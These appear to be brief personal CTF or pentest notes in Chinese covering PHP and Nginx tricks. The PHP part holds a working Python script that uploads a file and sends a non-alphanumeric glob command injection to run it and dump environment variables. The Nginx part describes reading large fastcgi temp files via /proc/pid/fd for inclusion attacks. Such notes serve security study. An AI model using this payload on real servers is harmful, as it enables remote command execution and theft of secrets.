# PHP
	- [参考](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
	- ```python
	  import time
	  import requests
	  
	  url = "http://hk2.xxx.xyz:3003/"
	  
	  while True:
	      r = requests.post(
	          url, 
	          params = {
	              "c": ". /[_-{][_-{][_-{]/[_-{][_-{][_-{]?????[@-[]"
	          },
	          files = {
	              "file":("a.txt", "env")
	          }
	      )
	      if r.text:
	          break
	      time.sleep(0.5)
	  
	  print(r.text)
	  ```
- # Nginx
	- [参考](https://www.cnblogs.com/h0cksr/p/16189739.html)
	- 大于32k的文件会被保存在`/var/lib/nginx/fastcgi`中,但是几乎会被立即删除
	- 可以使用`/proc/pid/fd`读取
-